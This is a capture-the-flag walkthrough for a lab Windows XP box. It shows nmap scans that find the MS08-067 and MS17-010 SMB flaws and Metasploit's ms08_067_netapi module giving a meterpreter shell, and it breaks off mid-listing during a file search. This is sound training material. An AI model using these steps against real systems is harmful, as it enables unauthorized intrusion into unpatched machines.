## NMAP, Business as Usual
```
hippoeug@kali:~$ nmap -sC -sV -A -v 10.10.10.4 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 21:57 +08
...
Nmap scan report for 10.10.10.4
Host is up (0.0055s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h00m00s, deviation: 1h24m50s, median: -5h00m00s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c9:7c (VMware)                                                                
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|_  HTB<1e>              Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-27T12:57:27+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

```
Wow, interesting, Windows XP (2000 LAN Manager). Unpatched Windows, hell yeah. Let's see..

## Vulnerability Search
```
hippoeug@kali:~$ searchsploit windows 2000 smb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                                      | windows/remote/20.txt
Microsoft Windows XP/2000 - 'Mrxsmb.sys' Local Privilege Escalation (MS06-030)                                                      | windows/local/1911.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                           | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                           | windows/dos/21747.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Hmm, maybe I need something more direct. Let's scan the ports and see.

## NMAP Again
```
hippoeug@kali:~$ sudo nmap -p 445 --script=vuln 10.10.10.4 -v -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 22:48 +08
...
Nmap scan report for 10.10.10.4
Host is up (0.0051s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```
OOH, it's vulnerable to `smb-vuln-ms08-067`. And good ol' `smb-vuln-ms17-010` eternalblue which I'm not gonna attempt on this poor XP machine.

## Metasploit!
Let's try it with metasploit. Source: http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html

```
msfconsole
use exploit/windows/smb/ms08_067_netapi
```
And we're in, time to find the flags.

```
meterpreter > search -f *.txt
Found 26 results...
    c:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\brndlog.txt (10389 bytes)
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
    c:\Documents and Settings\Default User\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
    c:\Documents and Settings\john\Application Data\Microsoft\Internet Explorer\brndlog.txt (10380 bytes)
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
    c:\Program Files\Movie Maker\Shared\Empty.txt (18 bytes)
    c:\Program Files\Movie Maker\Shared\Profiles\Blank.txt (21 bytes)
    c:\Program Files\Outlook Express\msoe.txt (133 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\snapshot\domain.txt (26 bytes)
    c:\WINDOWS\OEWABLog.txt (1178 bytes)
    c:\WINDOWS\SchedLgU.Txt (1308 byte
```
